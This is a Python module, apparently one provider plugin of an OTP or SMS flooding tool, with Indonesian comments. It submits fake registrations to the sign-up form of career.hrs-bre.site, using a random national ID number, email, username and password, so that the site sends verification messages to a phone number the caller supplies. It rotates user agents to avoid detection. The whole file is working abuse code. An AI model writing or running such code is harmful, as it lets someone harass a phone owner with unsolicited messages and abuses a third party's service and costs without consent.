"""Provider HRS-BRE – kirim OTP via career.hrs-bre.site."""
from __future__ import annotations

import random
import string
import time
import requests
from requests.sessions import Session

from provider.base import DEFAULT_TIMEOUT, ProviderResult, create_session
from provider.utils import fmt_08, generate_multipart, get_random_user_agent

BASE_URL = "https://career.hrs-bre.site"
SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"


def send_otp_detailed(mobile: str, session: Session | None = None) -> ProviderResult:
    """Kirim OTP ke *mobile* via HRS-BRE dengan informasi durasi dan status."""
    t0 = time.perf_counter()
    sess = session or create_session()
    try:
        phone_08 = fmt_08(mobile)
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Origin": BASE_URL,
            "Referer": SIGN_UP_PAGE,
        }
        r = sess.get(SIGN_UP_PAGE, headers=headers, timeout=DEFAULT_TIMEOUT)
        if r.status_code != 200:
            return ProviderResult(
                provider="HRS-BRE",
                success=False,
                elapsed=time.perf_counter() - t0,
                message=f"Landing HTTP {r.status_code}",
            )

        nik = "".join(random.choices(string.digits, k=16))
        email = "".join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
        username = "".join(random.choices(string.ascii_letters, k=8))
        password = "Aa1" + "".join(random.choices(string.ascii_letters + string.digits + "!@#$", k=7))
        boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))

        data = {
            "nik": nik,
            "email": email,
            "whatsapp": phone_08,
            "username": username,
            "password": password,
        }
        body = generate_multipart(data, boundary)
        post_headers = dict(headers)
        post_headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

        resp = sess.post(SIGN_UP_URL, headers=post_headers, data=body, timeout=DEFAULT_TIMEOUT)
        elapsed = time.perf_counter() - t0
        text = resp.text.lower()
        is_ok = resp.status_code in (200, 201) or any(
            kw in text for kw in ["success", "berhasil", "otp", "verifikasi", "selamat"]
        )
        msg = "Berhasil" if is_ok else f"HTTP {resp.status_code}"
        return ProviderResult(
            provider="HRS-BRE",
            success=is_ok,
            elapsed=elapsed,
            message=msg,
        )
    except Exception as exc:  # pylint: disable=broad-except
        return ProviderResult(
            provider="HRS-BRE",
            success=False,
            elapsed=time.perf_counter() - t0,
            message=str(exc),
        )


def send_otp(mobile: str) -> bool:
    """Kirim OTP ke *mobile* via HRS-BRE. Kembalikan True jika berhasil."""
    return send_otp_detailed(mobile).success
